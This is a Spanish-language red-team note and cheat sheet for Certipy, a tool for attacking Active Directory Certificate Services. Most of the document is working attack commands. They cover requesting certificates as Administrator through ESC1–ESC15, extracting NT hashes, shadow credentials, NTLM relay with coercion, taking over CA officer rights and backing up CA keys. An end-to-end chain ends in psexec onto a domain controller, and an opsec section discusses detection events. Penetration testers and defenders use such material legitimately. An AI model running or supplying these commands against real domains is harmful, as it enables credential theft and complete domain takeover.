---
aliases:
  - Certipy-AD
tags:
  - tool/certipy
  - technique/credential-access
  - technique/privilege-escalation
  - service/ad-cs
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Credential Harvesting]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Tool
linked:
  - "[[AD CS Abuse]]"
  - "[[Shadow Credentials]]"
  - "[[NTLM Relay]]"
  - "[[Kerberoasting]]"
  - "[[Pass-the-Ticket]]"
  - "[[Impacket Toolkit]]"
  - "[[Rubeus]]"
---
# Certipy

---

## Overview

Tool Python para enum + explotación de **Active Directory Certificate Services (AD CS)**. Referencia de facto para ESC1-ESC15, reemplaza a Certify (C#). Autor: Oliver Lyak.

Install: `pipx install certipy-ad` → binario `certipy`.

> Regla: Certipy acepta `-u user@domain`, `-p pass`, `-hashes :NT`, `-k` (Kerberos ccache), `-aes <key>`. Todas las operaciones soportan PtH y PtT.

---

## Sintaxis base

```bash
certipy <subcommand> -u user@domain.local -p pass -dc-ip <dc> [opciones]
certipy <subcommand> -u user@domain.local -hashes :<NT> -dc-ip <dc>
certipy <subcommand> -u user@domain.local -k -no-pass -dc-ip <dc>   # ccache
certipy <subcommand> -u user@domain.local -aes <aes256> -dc-ip <dc>
```

---

## find — enumeración

Scanea AD CS y marca templates vulnerables por ESC:

```bash
# Básico
certipy find -u user@domain.local -p pass -dc-ip <dc>

# Solo vulnerables
certipy find -u user@domain.local -p pass -dc-ip <dc> -vulnerable

# Output formateado
certipy find -u user@domain.local -p pass -dc-ip <dc> -text -stdout
certipy find -u user@domain.local -p pass -dc-ip <dc> -json                # JSON
certipy find -u user@domain.local -p pass -dc-ip <dc> -bloodhound          # edges for BH

# Solo enabled templates
certipy find -u user@domain.local -p pass -dc-ip <dc> -enabled

# Con LDAP channel binding (EPA on)
certipy find -u user@domain.local -p pass -dc-ip <dc> -ldap-channel-binding

# Escalated lookup (ESC13, ESC14, ESC15)
certipy find -u user@domain.local -p pass -dc-ip <dc> -old-bloodhound
```

Output (textmode) muestra:

- CAs disponibles, configuración, permisos.
- Templates + autorización + configuración por flag vulnerable.
- Clasificación automática: ESC1, ESC2, ESC3, ESC4, ESC5, ESC6, ESC7, ESC8, ESC9, ESC10, ESC11, ESC13, ESC14, ESC15.

---

## req — request certificate (ESC1, ESC2, ESC3, ESC15)

### ESC1 — Subject Alt Name controlable

```bash
certipy req -u user@domain.local -p pass -ca 'CA-NAME' \
  -template 'VulnTemplate' -upn 'administrator@domain.local'

# SAN con DNS (ESC15 / wildcard)
certipy req -u user@domain.local -p pass -ca 'CA-NAME' \
  -template 'VulnTemplate' -dns 'dc01.domain.local'

# Output: .pfx con key + cert
```

### ESC2 — Any Purpose / SubCA templates

```bash
certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'SubCA' \
  -on-behalf-of 'domain\Administrator' -pfx agent.pfx
```

### ESC3 — Enrollment Agent template

```bash
# Paso 1: obtener cert de Enrollment Agent
certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'EnrollmentAgent'

# Paso 2: usar ese cert para pedir cert de Administrator
certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'User' \
  -on-behalf-of 'domain\Administrator' -pfx agent.pfx
```

### ESC15 — EKUwu (schema v1, client-supplied EKU)

```bash
certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'WebServer' \
  -upn 'administrator@domain.local' -application-policies 'Client Authentication'
```

---

## auth — usar cert para obtener TGT + NThash

```bash
# PKINIT + UnPAC-the-hash
certipy auth -pfx administrator.pfx -dc-ip <dc>
# Output: ccache + NT hash del user del cert

# Si el cert no tiene UPN/DNS detectable
certipy auth -pfx administrator.pfx -username Administrator -domain domain.local -dc-ip <dc>

# Solo imprimir TGT / nt hash
certipy auth -pfx admin.pfx -dc-ip <dc> -no-save
certipy auth -pfx admin.pfx -dc-ip <dc> -kirbi                  # output kirbi
```

Flow completo:

```bash
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@dc01.domain.local
```

---

## shadow — Shadow Credentials (msDS-KeyCredentialLink)

Prereq: `GenericWrite` / `WriteProperty` sobre target.

```bash
# Auto: add key → PKINIT → get NT hash → cleanup
certipy shadow auto -u user@domain.local -p pass -account victim -dc-ip <dc>

# Manual stages
certipy shadow add -u user@domain.local -p pass -account victim -dc-ip <dc>
certipy shadow list -u user@domain.local -p pass -account victim -dc-ip <dc>
certipy shadow remove -u user@domain.local -p pass -account victim -dc-ip <dc> -device-id <id>
certipy shadow clear -u user@domain.local -p pass -account victim -dc-ip <dc>
```

Ver [[Shadow Credentials]].

---

## relay — ntlmrelayx-style ADCS attack (ESC8)

Spoofea server HTTP/S + relay NTLM → cert.

```bash
# Coerce NTLM de target → Certipy recibe → request cert como target
certipy relay -target http://ca.domain.local/certsrv/certfnsh.asp -template 'DomainController'
certipy relay -target http://ca/certsrv -template 'Machine'

# HTTPS + endpoint /CertSrv/mscep/mscep.dll (SCEP)
certipy relay -target http://ca/certsrv -template 'User' -port 445
```

Luego disparar coerción:

```bash
certipy-petitpotam -u user -p pass -t <target> <attacker>
# o
coercer coerce -u user -p pass -l <attacker> -t <target>
```

Ver [[NTLM Relay]] / [[Authentication Coercion]].

---

## ca — administración CA (ESC7: ManageCA/ManageCertificates)

```bash
# Listar templates habilitados en CA
certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -list-templates

# Habilitar template deshabilitado
certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -enable-template 'SubCA'

# Aprobar request pendiente (ManageCertificates ACL)
certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -issue-request <RequestId>

# Denegar request
certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -deny-request <RequestId>

# Listar officers
certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -list-officers

# Agregar officer (ManageCA)
certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -add-officer attacker

# Remover officer
certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -remove-officer attacker

# Backup CA cert + key (si ACL)
certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -backup
```

---

## account — manipular cuentas vía LDAP

```bash
# Crear computer account (MAQ > 0)
certipy account create -u user@domain.local -p pass -user 'FAKE$' -pass 'Passw0rd1!' -dc-ip <dc>

# Modificar userPrincipalName (ESC9, ESC10)
certipy account update -u user@domain.local -p pass -user victim -upn 'administrator@domain.local' -dc-ip <dc>
certipy account update -u user@domain.local -p pass -user victim -dns 'dc01.domain.local' -dc-ip <dc>

# Restaurar
certipy account update -u user@domain.local -p pass -user victim -upn 'victim@domain.local' -dc-ip <dc>

# Leer attrs
certipy account read -u user@domain.local -p pass -user victim -dc-ip <dc>

# Agregar Shadow Creds (alias de `shadow add`)
certipy account add-key -u user@domain.local -p pass -user victim -dc-ip <dc>

# Borrar
certipy account delete -u user@domain.local -p pass -user 'FAKE$' -dc-ip <dc>
```

---

## cert — manipulación de PFX / PEM

```bash
# Extraer .pfx → .pem (key + cert)
certipy cert -pfx admin.pfx -nocert -out admin.key
certipy cert -pfx admin.pfx -nokey  -out admin.crt

# Combinar pem → pfx
certipy cert -key admin.key -cert admin.crt -export -out admin.pfx

# Cambiar password del PFX
certipy cert -pfx admin.pfx -password 'old' -export -out admin-new.pfx -password 'new'

# Info
certipy cert -pfx admin.pfx -info
```

---

## parse — parsear output `.zip` de Certify/SharpHound

```bash
certipy parse -file certify.zip -out parsed.json
```

---

## template — abuse de WriteProperty en template (ESC4)

```bash
# Save backup del template
certipy template -u user@domain.local -p pass -template 'VulnTemplate' -save-old

# Reescribir template como vulnerable (setear SAN controlable)
certipy template -u user@domain.local -p pass -template 'VulnTemplate' \
  -write-default-configuration

# Restore backup
certipy template -u user@domain.local -p pass -template 'VulnTemplate' \
  -configuration template.json
```

---

## Matriz ESC → comando Certipy

| ESC | Descripción | Comando |
|---|---|---|
| ESC1 | SAN controlable | `req -upn admin@...` |
| ESC2 | Any Purpose / SubCA | `req -on-behalf-of ... -pfx agent.pfx` |
| ESC3 | Enrollment Agent | `req` con agent cert |
| ESC4 | WriteProperty en template | `template -write-default-configuration` |
| ESC5 | Access control sobre CA objects (PKI container) | N/A directo — setear ACL via `dacledit` |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | `req -upn admin@...` (si flag activa) |
| ESC7 | Vulnerable CA ACL (ManageCA/Certificates) | `ca -add-officer` / `-issue-request` |
| ESC8 | NTLM Relay a HTTP endpoint | `relay -target http://ca/certsrv` |
| ESC9 | noSecurityExtension + weak UPN mapping | `account update -upn ...` + `req` |
| ESC10 | Weak cert-to-account mapping | `account update -dns ...` + `req` |
| ESC11 | NTLM Relay a RPC IF_ICertPassage | `relay -target rpc://ca` |
| ESC13 | Issuance policies con OID groupLink | `req` + membership auto |
| ESC14 | Weak explicit mapping via altSecurityIdentities | `account update -alt-security-identities ...` |
| ESC15 | EKUwu — schema v1 + client EKU | `req -application-policies "Client Authentication"` |

---

## Workflow end-to-end típico (ESC1)

```bash
# 1. Descubrir
certipy find -u alice@domain.local -p pass -dc-ip 10.10.10.10 -vulnerable -text

# 2. Request cert como Administrator
certipy req -u alice@domain.local -p pass -ca 'CA-NAME' \
  -template 'VulnTemplate' -upn 'administrator@domain.local'

# 3. Auth → TGT + NT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# 4. Usar
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@dc01.domain.local
```

---

## Opsec

- `req` genera Event 4886/4887 en CA. Detectable con buena hygiene.
- `shadow auto` genera Event 4662 (attribute write) en DC — correlable con cert auth inmediata.
- `relay` genera tráfico HTTP al certsrv endpoint — visible en IIS logs.
- Preferir AES templates sobre RC4 si CA soporta.

---

## Referencias

- Repo: https://github.com/ly4k/Certipy
- ESC catalog: https://posts.specterops.io/certified-pre-owned-d95910965cd2
- Academy: https://specterops.io/so-con2024/
